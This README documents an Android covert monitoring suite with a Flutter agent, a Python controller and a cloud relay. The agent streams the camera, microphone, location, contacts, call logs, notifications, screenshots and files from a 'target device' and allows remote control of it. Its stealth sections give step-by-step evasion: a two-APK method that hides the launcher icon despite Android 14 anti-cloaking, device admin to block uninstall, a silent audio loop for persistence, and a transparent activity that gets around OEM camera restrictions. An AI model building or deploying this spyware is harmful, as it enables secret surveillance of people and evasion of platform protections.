# Android Security Controller

A real-time, cross-platform remote monitoring suite for Android devices. The system consists of three components: a **Flutter-based Android agent**, a **Python desktop controller**, and a **cloud signaling relay**. Communication is handled over persistent WebSocket connections routed through a Render-hosted relay server, enabling monitoring from anywhere with an internet connection.

---

## Table of Contents

- [Architecture](#architecture)
- [System Requirements](#system-requirements)
- [Project Structure](#project-structure)
- [Setup and Deployment](#setup-and-deployment)
- [Control Panel Reference](#control-panel-reference)
- [Stealth and Persistence](#stealth-and-persistence)
- [Two-APK Icon Hiding Strategy](#two-apk-icon-hiding-strategy)
- [Known Issues and Solutions](#known-issues-and-solutions)
- [Technical Deep Dives](#technical-deep-dives)

---

## Architecture

```
+-------------------+        WSS (Cloud Relay)        +-------------------+
|  Android Agent    | <-----------------------------> |  PC Controller    |
|  (Flutter + Kotlin)|       Render / aiohttp         |  (Python / Tkinter)|
+-------------------+                                 +-------------------+
        |                                                      |
        v                                                      v
  MonitoringService.kt                                    main.py
  (Foreground Service)                                (CustomTkinter GUI)
  WebSocket Client                                   WebSocket Client
  Camera, Mic, GPS                                   Audio, Display, Map
  File Access, Contacts                              File Browser, Logs
```

All data flows through a cloud WebSocket relay (`signaling_server.py`) deployed on Render. Both the Android agent and the PC controller connect as WebSocket clients. The server broadcasts messages between paired devices based on their registered roles (`android_phone` and `controller`).

---

## System Requirements

| Component       | Requirement                                      |
|-----------------|--------------------------------------------------|
| Android Agent   | Android 10+ (API 29). Tested on Android 14.      |
| PC Controller   | Windows 10/11, Python 3.10+                      |
| Relay Server    | Any host supporting Python (deployed on Render)   |
| Network         | Internet connection on both devices               |

### Python Dependencies (Controller)

```
customtkinter
websockets
pyaudio
numpy
Pillow
aiortc
tkintermapview
requests
```

### Flutter Dependencies (Agent)

```
flutter_sound, flutter_webrtc, flutter_contacts, call_log,
permission_handler, device_info_plus, battery_plus,
connectivity_plus, geolocator, usage_stats, network_info_plus,
web_socket_channel, audio_session, path_provider
```

---

## Project Structure

```
controller/
|-- Backend/
|   |-- signaling_server.py        # Cloud relay server (aiohttp)
|   |-- Antigravity.ps1            # Deployment automation script
|   |-- requirements.txt
|
|-- Monitoring/
|   |-- main.py                    # Desktop controller GUI (2300+ lines)
|   |-- webrtc_handler.py          # WebSocket transport + audio pipeline
|   |-- signaling.py               # Legacy signaling abstraction
|   |-- file_operations.py         # File transfer manager
|   |-- download_manager.py        # Download progress UI
|   |-- start_controller.bat       # One-click launcher
|   |-- server_url.txt             # Cloud relay URL (editable)
|   |-- live_tracker.html          # Standalone GPS map viewer
|
|-- frontend/android_security/
|   |-- lib/
|   |   |-- main.dart              # Onboarding dashboard + permissions
|   |   |-- webrtc_service.dart    # Flutter-side WebSocket bridge
|   |   |-- server_url.dart        # Relay URL config
|   |
|   |-- android/app/src/main/
|       |-- AndroidManifest.xml    # Permissions + service declarations
|       |-- kotlin/.../
|           |-- MainActivity.kt        # Method channels + admin logic
|           |-- MonitoringService.kt   # Core background service (1600+ lines)
|           |-- RemoteControlService.kt# Accessibility-based remote input
|           |-- NotificationReceiverService.kt  # Notification interception
|           |-- BootReceiver.kt        # Auto-start on device boot
|           |-- HiddenCaptureActivity.kt # Stealth camera proxy
|           |-- AdminReceiver.kt       # Device admin handler
```

---

## Setup and Deployment

### 1. Deploy the Relay Server

```bash
# On Render, Heroku, or any cloud host
cd Backend/
pip install -r requirements.txt
python signaling_server.py
```

The server listens on the port defined by the `PORT` environment variable (default: 8080). Update `Monitoring/server_url.txt` and `frontend/android_security/lib/server_url.dart` with the deployed WSS URL.

### 2. Build the Android Agent

```bash
cd frontend/android_security/
flutter build apk --release
```

The output APK is located at `build/app/outputs/flutter-apk/app-release.apk`. Install it on the target device and complete the onboarding flow to grant all required permissions.

### 3. Start the PC Controller

```bash
cd Monitoring/
pip install -r requirements.txt
python main.py
```

Or use the launcher script:

```bash
start_controller.bat
```

The controller auto-connects to the relay server and waits for the Android agent to come online.

---

## Control Panel Reference

The desktop controller is organized into a sidebar navigation panel on the left, a main content area in the center, and an optional right panel for live feeds.

### Dashboard Panels

| Panel              | Description                                                                                      |
|--------------------|--------------------------------------------------------------------------------------------------|
| **Monitor**        | System dashboard showing battery level, charging state, network type, WiFi SSID, signal strength, Bluetooth status, device model, and Android version. All fields update in real time via periodic status messages from the agent. |
| **Camera**         | Live JPEG stream from the device camera. Supports front/back lens switching, 90/180/270 degree rotation, and horizontal mirroring. Frames are captured natively via Camera2 API and sent as binary WebSocket messages (tag `0x05`). |
| **Contacts**       | Full contact list extracted from the device. Displays name and all associated phone numbers.      |
| **Call Logs**      | Device call history including contact name, phone number, call type (incoming/outgoing/missed), duration, and timestamp. |
| **Parental Control** | App usage statistics for the last 7 days. Shows per-app foreground time, sorted by usage. Requires Usage Access permission on the device. |
| **Live Location**  | Real-time GPS tracking displayed on an interactive map (tkintermapview). Shows coordinates, accuracy radius, altitude, speed, and provider source. Updates on every location change event from the device. |
| **Activity Logs**  | Notification interception feed. Captures all notifications received on the device including app name, title, text content, and timestamp. Requires Notification Listener permission. |
| **Stealth Screenshot** | Captures a screenshot of the device's current screen using the Accessibility Service. The image is transmitted as binary data (tag `0x07`) and displayed in a preview window on the controller. |
| **Applications**   | Lists all installed applications on the device. Supports launching any app remotely by package name. |
| **Filesystem**     | Full file browser for the device storage. Supports navigation, file preview (text, images), download, upload, rename, delete, copy, cut, paste, batch operations, and file search by pattern. |

### Audio Channels

| Channel              | Direction            | Description                                                    |
|----------------------|----------------------|----------------------------------------------------------------|
| **Phone Mic (Listen)** | Phone --> PC       | Streams the device microphone to the PC speakers. Audio is captured via Android's AudioRecord API at 8kHz mono PCM16 with hardware noise suppression and echo cancellation. Digital gain (4x) is applied before transmission. Binary tag `0x01`. |
| **PC Mic --> Speaker** | PC --> Phone       | Streams the PC microphone to the device speaker. Audio is captured via PyAudio at 8kHz mono PCM16 with digital gain (4x). Binary tag `0x04`. The phone speaker is only activated when this mode is explicitly enabled to prevent feedback loops. |
| **Voice Call**         | Bidirectional      | Full-duplex audio. Activates both channels simultaneously.     |

### Remote Control

| Action           | Description                                                      |
|------------------|------------------------------------------------------------------|
| **Wake Screen**  | Sends a wake signal to turn on the device display.               |
| **Home Button**  | Simulates pressing the Android home button via Accessibility.    |
| **Recent Apps**  | Opens the Android recent apps view via Accessibility.            |
| **Remote Touch** | Tap, swipe, long press, and text input via Accessibility Service.|

---

## Stealth and Persistence

### Background Persistence

The Android agent runs as a foreground service (`MonitoringService`) with the following persistence mechanisms:

| Mechanism                  | Purpose                                                          |
|----------------------------|------------------------------------------------------------------|
| Foreground Service         | Prevents the OS from killing the process. Uses `SPECIAL_USE` FGS type with fallback for Android 14 restrictions. |
| Wake Lock                  | Keeps the CPU active even when the screen is off.                |
| WiFi Lock                  | Prevents the WiFi radio from entering power-saving mode.         |
| Silent Audio Loop          | Plays inaudible audio to keep the process marked as active.      |
| Boot Receiver              | Automatically restarts the service after device reboot.          |
| Battery Optimization Bypass | Requests whitelisting from Android's Doze mode.                 |
| Device Admin               | Prevents the app from being uninstalled without admin deactivation. |
| Heartbeat System           | Sends periodic heartbeats (30s interval) to maintain WebSocket connection and detect disconnections. |

### Device Identification

Each device generates a unique, persistent ID on first run. The ID is composed of the device model name and a random 4-character suffix (e.g., `rmx3990_a794`). This ID is stored in SharedPreferences and survives app restarts. It is used in every WebSocket message to allow the controller to track multiple devices simultaneously.

---

## Two-APK Icon Hiding Strategy

Android 14 introduced strict anti-cloaking measures. Programmatically disabling the launcher component causes the OS to create a "Ghost Shortcut" that redirects to App Info. The reliable workaround is a two-APK deployment:

| Step | APK     | Manifest State              | Purpose                                      |
|------|---------|-----------------------------|----------------------------------------------|
| 1    | APK 1   | LauncherAlias **enabled**   | Install and open. Grant all permissions.      |
| 2    | APK 2   | LauncherAlias **removed**   | Install over APK 1. Icon disappears.          |
| 3    | Reboot  | --                          | Forces launcher cache refresh.                |

Both APKs share the same package name and signing key. Installing APK 2 over APK 1 preserves all granted permissions while removing the launcher entry point. The app remains accessible via the PC controller or ADB.

To build APK 2, remove the `<activity-alias>` block containing the `LAUNCHER` intent-filter from `AndroidManifest.xml` and rebuild:

```xml
<!-- Remove this block for APK 2 -->
<activity-alias
    android:name="com.example.android_security.LauncherAlias"
    android:enabled="true"
    android:exported="true"
    android:label="Android Security"
    android:targetActivity="com.example.android_security.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity-alias>
```

---

## Known Issues and Solutions

### Issues Encountered During Development

| Issue | Root Cause | Resolution |
|-------|-----------|------------|
| Camera blocked on Oppo/Realme/Vivo (ColorOS) | OEM blocks Camera2 API access from background services. The OS checks for active window focus before allowing hardware access. | Implemented a `FullScreenIntent` proxy (`HiddenCaptureActivity`) that temporarily brings the app to the foreground with a transparent activity, satisfies the focus requirement, captures the frame, and minimizes. |
| Ghost Shortcut on Android 14 | Disabling the only launcher component via `setComponentEnabledSetting` causes Android 14 to create a persistent shortcut that opens App Info. | Switched to the two-APK strategy. APK 2 physically removes the launcher intent-filter from the manifest. |
| Service crash on Android 14 boot | `startForeground()` with `FOREGROUND_SERVICE_CAMERA` or `FOREGROUND_SERVICE_LOCATION` types throws `SecurityException` when called from a background context (BootReceiver). | Added a try-catch fallback: if the specific FGS type is rejected, the service falls back to `FOREGROUND_SERVICE_SPECIAL_USE` to stay alive. |
| Device heating during monitoring | Continuous camera streaming and audio recording at high sample rates caused sustained CPU/GPU load. | Reduced camera JPEG quality to 60%, lowered audio sample rate to 8kHz, added frame throttling, and made the invisible overlay 1x1 pixel to minimize GPU compositing. |
| Audio feedback loop (Phone Mic Listen) | The phone's audio player was auto-initialized on startup. When the mic was active, any echoed audio from the server would play through the phone speaker, creating a feedback loop. | Made the phone speaker on-demand only. It now activates exclusively when the PC sends a `start_speaker` command (Voice Call or PC Mic to Speaker modes). Added a `speakerActive` flag guard on both the Dart and Kotlin layers. |
| Controller stops receiving data after 5 seconds | Two bugs: (1) The beacon task crashed on binary WebSocket messages because `json.loads()` was called on raw bytes. (2) A typo `msg_type` instead of `mtype` caused a `NameError` caught by a bare `except` clause, silently killing heartbeat processing. | Added binary message filtering in the beacon task. Fixed the variable name typo. Replaced bare `except` with `except Exception as e` for visibility. |
| Hardcoded device ID (`main_device`) | All devices registered with the same identifier, making multi-device tracking impossible and causing slot conflicts. | Each device now generates a unique persistent ID from `Build.MODEL` + a random UUID suffix, stored in SharedPreferences. |
| WebSocket connection instability | The relay server on Render's free tier has cold-start delays and periodic idle timeouts. | Implemented exponential backoff reconnection (2s to 30s), persistent heartbeats, and auto-reconnect on both the Android and PC sides. |
| Notification permission missing (Android 13+) | Android 13 requires explicit `POST_NOTIFICATIONS` permission. Without it, `startForeground()` fails silently and the service is killed. | Added `POST_NOTIFICATIONS` to the manifest and integrated the permission request into the onboarding flow. |

---

## Technical Deep Dives

### WebSocket Binary Protocol

All real-time streaming data uses a single-byte tag prefix for efficient routing:

| Tag    | Direction      | Content                        |
|--------|----------------|--------------------------------|
| `0x01` | Phone --> PC   | Microphone audio (PCM16 8kHz)  |
| `0x02` | Phone --> PC   | File transfer chunk            |
| `0x03` | Phone --> PC   | Inline thumbnail (PNG)         |
| `0x04` | PC --> Phone   | PC microphone audio (PCM16 8kHz) |
| `0x05` | Phone --> PC   | Camera frame (JPEG)            |
| `0x06` | Phone --> PC   | Screen capture frame (JPEG)    |
| `0x07` | Phone --> PC   | Stealth screenshot (PNG)       |

### Foreground Service Type Strategy (Android 14)

Android 14 enforces strict foreground service type declarations. The agent dynamically adjusts its FGS type based on active features:

```
Base:       SPECIAL_USE (always active)
+ Camera:   SPECIAL_USE | CAMERA
+ Screen:   SPECIAL_USE | MEDIA_PROJECTION
+ Mic:      SPECIAL_USE | MICROPHONE
+ GPS:      SPECIAL_USE | LOCATION
```

If the OS rejects a specific type during background initialization (e.g., boot), the service catches the `SecurityException` and falls back to `SPECIAL_USE` only, then re-requests the full type set when hardware access is actually needed.

### Signaling Server Design

The relay server (`signaling_server.py`) is a stateless message broker built on `aiohttp`. It maintains a dictionary of connected WebSocket clients tagged by role. All messages are broadcast to all other connected clients. Binary messages are forwarded as-is without inspection. Text messages are parsed to extract the sender role and inject `_sender_role` metadata before forwarding.

The server supports health checks on `/health` and smart WebSocket/HTTP detection on `/` for deployment platforms that require HTTP health probes (Render, Railway).

---

## License

This project is for authorized security research and enterprise device management only.
